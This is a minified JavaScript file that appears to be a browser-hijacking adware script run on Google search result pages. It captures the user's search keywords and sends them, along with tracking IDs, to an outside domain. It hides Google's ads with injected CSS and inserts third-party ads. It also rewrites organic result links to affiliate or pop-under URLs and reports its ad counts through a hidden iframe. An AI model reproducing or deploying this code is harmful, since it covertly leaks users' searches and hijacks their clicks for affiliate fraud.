(function(){if (typeof dk93k4H4e0wSDf32 != 'undefined') {return;}dk93k4H4e0wSDf32 = true;var trkid='5ccb949f5a262';var uid='52537X0000XZZZZZZZZZZZZZZZZZZZZZ';var affid='3453';var dom = 'laubeyrietechnology.com';var uriprefix = '';var tc = '/script/w.php';var at = '/script/at.php';var btracking = '';var tweets_path = '/ct/tweets.php';if(!document.querySelector('meta[name="referrer"]')){var meta=document.createElement("meta");meta.name="referrer";meta.content="origin";var head=document.getElementsByTagName("head");if(head){head[0].appendChild(meta)}}var checkinc=0;var obs=0;var gcheckrunning;function getXDomainRequest(){var e=null;if(window.XDomainRequest)e=new XDomainRequest;else if(window.XMLHttpRequest)e=new XMLHttpRequest;e.withCredentials=true;return e}function getCurrentKw(){var matches=document.location.href.match(/[&\?]q=([^&#]*)/);if(matches){return decodeURIComponent(matches[1].replace(/\+/g," "))}return""}function fixmargin(){var centercol=document.getElementById("center_col");var sadsfs=document.getElementById("sadsfs");if(typeof sadsfs!=="undefined"&&sadsfs!==null&&typeof centercol!=="undefined"&&centercol!==null){sadsfs.style.marginLeft=centercol.offsetLeft+"px"}else{setTimeout(function(){fixmargin()},200)}}function fixpadding(){var res=document.getElementById("res");var ads_wrappers=document.querySelectorAll("#f"+trkid);if(ads_wrappers&&res){if(typeof window.getComputedStyle!=="undefined"){var padding_value=window.getComputedStyle(res,null).getPropertyValue("padding-left");for(var i=0;i<ads_wrappers.length;i++){ads_wrappers[i].style.paddingLeft=padding_value}}}else{setTimeout(function(){fixpadding()},200)}}function insertAfter(referenceNode,newNode){if(referenceNode.parentNode){referenceNode.parentNode.insertBefore(newNode,referenceNode.nextSibling)}}function sendData(keyword,by){var getAdsFeed=function(){var tbm=findGetParameter("tbm");var redirUrl="https://"+dom+tc+"?t=1&u="+uid+"&a="+affid+"&tr="+trkid+"&keyword="+encodeURIComponent(keyword)+by+"&b="+btracking+"&tbm="+tbm;var u=getXDomainRequest();u.onload=function(){processAds(u.responseText)};u.open("GET",redirUrl);u.send()};if(typeof getAds=="function"){getAds(keyword,getAdsFeed)}else{getAdsFeed()}}function findGetParameter(parameterName){var result="",tmp=[];window.location.search.substr(1).split("&").forEach(function(item){tmp=item.split("=");if(tmp[0]===parameterName)result=decodeURIComponent(tmp[1])});return result}function processAds(response){var ads_tracked=[];var ads=document.createElement("div");ads.setAttribute("id","sadsfs");ads.innerHTML=response;var oldads=document.getElementById("sadsfs");if(oldads)oldads.parentNode.removeChild(oldads);var classname="s";classname+=trkid;var adsclone=document.createElement("div");adsclone.innerHTML=response;var adsarray=adsclone.getElementsByClassName(classname);var googlelistingsarray=document.querySelectorAll(".srg .g");if(!googlelistingsarray){googlelistingsarray=document.querySelectorAll("_NId g")}googlelistingsarray=[].slice.call(googlelistingsarray);adsarray=[].slice.call(adsarray);var codetocheck=response;if(codetocheck.indexOf("bf3dSe2NF9")>-1){var nb_ads=0;for(var i=0,len=adsarray.length;i<len;i++){if(codetocheck.indexOf("fjuetdg6sk")>-1){if(resultsClick(adsarray[i],googlelistingsarray[i])){nb_ads++}}else{if(algopopunder(adsarray[i],googlelistingsarray[i])){nb_ads++}}}ads_tracked.push(["po",nb_ads])}else if(codetocheck.indexOf("gjusD93jd")>-1){var nb_ads=0;for(var i=0,len=googlelistingsarray.length;i<len;i++){if(algouserclick(googlelistingsarray[i])){nb_ads++}}ads_tracked.push(["au",nb_ads])}else{var north_ads=ads.getElementsByClassName(classname);var north_ads_length=north_ads.length;for(var j=0,len=north_ads_length;j<len;j++){replaceRel(north_ads[j],"n")}insertinto("center_col",ads);ads_tracked.push(["n",north_ads_length]);var cloned_ads=ads.cloneNode(true);var south_ads=cloned_ads.getElementsByClassName(classname);var south_ads_length=south_ads.length;for(var j=0,len=south_ads_length;j<len;j++){replaceRel(south_ads[j],"s")}if(typeof hal!="undefined"&&adsarray.length>=5){document.querySelector("#res").style="display: none;"}else{insertNext("#res",cloned_ads);ads_tracked.push(["s",south_ads_length])}fixmargin();fixpadding();if(codetocheck.indexOf("4kljsdf8")==-1){var stream_count=0;for(var j=0,len=adsarray.length;j<len;j++){var streamad=adsarray[j];var gad=googlelistingsarray[j+2];if(gad){var sitelinks=streamad.querySelector("ul");if(sitelinks){deleteElement(sitelinks)}insertAfter(gad,streamad);replaceRel(streamad,"st");stream_count++}}ads_tracked.push(["st",stream_count])}}adTrack(ads_tracked)}function deleteElement(e){if(e.parentNode)e.parentNode.removeChild(e)}function algopopunder(yad,gad){if(!gad){return}var yadurl=yad.querySelector("p a").getAttribute("onmousedown");var yadurl=urlcleanup(yadurl);yadurl+="&loc=pu";var h3_a=gad.querySelector("div a");var yturl=h3_a.getAttribute("href");gad.setAttribute("href",yadurl);var a=gad.getElementsByTagName("a");for(var i=0;i<a.length;i++){var urlgoogle=a[i].getAttribute("href");a[i].setAttribute("href",yadurl);a[i].removeAttribute("onmousedown");var uaft=a[i].getAttribute("href")}gad.addEventListener("click",function(event){openInNewTab(yturl)});if(gad&&h3_a){return true}}function resultsClick(yad,gad){if(!gad){return}var yadurl=yad.querySelector("p a").getAttribute("onmousedown");var h3_a=gad.querySelector("div a");var a=gad.getElementsByTagName("a");for(var i=0;i<a.length;i++){var urlgoogle=a[i].getAttribute("href");a[i].setAttribute("rel","pu");a[i].setAttribute("onmousedown",yadurl);a[i].removeAttribute("ping");a[i].addEventListener("click",function(event){openInNewTab(urlgoogle)})}if(gad&&h3_a){return true}}function algouserclick(gad){var yadurl="this.href='https://www.searchpage.com/?keywords="+encodeURIComponent(getCurrentKw())+"&u="+uid+"&a="+affid+"&loc=au'";gad.setAttribute("onmousedown",yadurl);var a=gad.getElementsByTagName("a");for(var i=0;i<a.length;i++){a[i].setAttribute("onmousedown",yadurl)}if(gad){return true}}function urlcleanup(url){var urlclean=url.replace(/this.href='|';/i,"").replace(/&loc=[^&]*/i,"");return urlclean}function galgpop(yad,gad){var yadurl=yad.querySelector("p a").getAttribute("onmousedown");var yadurl=urlcleanup(yadurl);gad.addEventListener("click",function(event){openInNewTab(yadurl)})}function replaceRel(ad,rel_new_value){var a_tag=ad.querySelector("a");a_tag.rel=rel_new_value}function openInNewTab(url){var win=window.open(url,"_blank")}function insertinto(target,ads){var targetdiv=document.getElementById(target);if(typeof targetdiv!=="undefined"&&targetdiv!==null){targetdiv.parentNode.insertBefore(ads,targetdiv);gcheckrunning=0}else{setTimeout(function(){insertinto(target,ads)},200)}}function insertNext(target,ads){var targetdiv=document.querySelector(target);if(typeof targetdiv!=="undefined"&&targetdiv!==null){insertAfter(targetdiv,ads);gcheckrunning=0}else{setTimeout(function(){insertNext(target,ads)},200)}}function adTrack(ads_stats){var params="";for(var i=0;i<ads_stats.length;i++){params+="&"+ads_stats[i][0]+"="+ads_stats[i][1]}if(params){var url="https://"+dom+at+"?t=1"+"&a="+affid+"&u="+uid+params;var iframe=document.createElement("iframe");iframe.style.display="none";iframe.style["height"]="0";iframe.style["width"]="0";document.body.appendChild(iframe);iframe.src=url}}function googlecheck(by){gcheckrunning=1;var oldads=document.getElementById("sadsfs");if(oldads)oldads.parentNode.removeChild(oldads);var css_text=".rl_full-list{background:#FFF;} .commercial-unit-desktop-top,.commercial-unit-desktop-rhs,#taw,#epbar,#mbEnd,#tads,#tadsb,.ads-ad{display:none!important}body,html{margin:0!important;padding:0!important;height:100%!important}span#plusiconl{left:25px!important}span#plusicon{right:25px!important}span#plusicon,span#plusiconl{font-size:50px;font-family:Tahoma,sans-serif!important;color:rgba(0,0,0,.04);position:fixed!important;top:40%!important}#navflowl{left:0!important}#navflow{right:0!important}#navflow,#navflowl{top:0!important;position:fixed!important;width:135px!important;min-height:100%!important;height:100%!important;float:left!important;z-index:2!important}.fill-div{display:block!important;height:100%!important;width:100%!important;text-decoration:none!important;position:absolute!important;min-height:1500px!important}.fill-div img{position:absolute!important;right:10px!important;top:50%!important}#navflow a:hover span#plusicon,#navflowl a:hover span#plusiconl{color:rgba(0,0,0,0.2)!important}";var node=document.createElement("style");if(node.styleSheet&&node.styleSheet.cssText){document.getElementsByTagName("head")[0].appendChild(node);node.styleSheet.cssText=css_text}else{node.innerHTML=css_text;document.head.appendChild(node)}var keyword=getCurrentKw();if(keyword.length>2&&keyword!=="Google"){sendData(keyword,by)}else if(checkinc<50){checkinc++;setTimeout(function(){googlecheck(by)},50)}else{gcheckrunning=0}}if(typeof by!=="undefined"){by="&by="+by}else{var by=""}if(window.self==window.top){googlecheck(by)}})();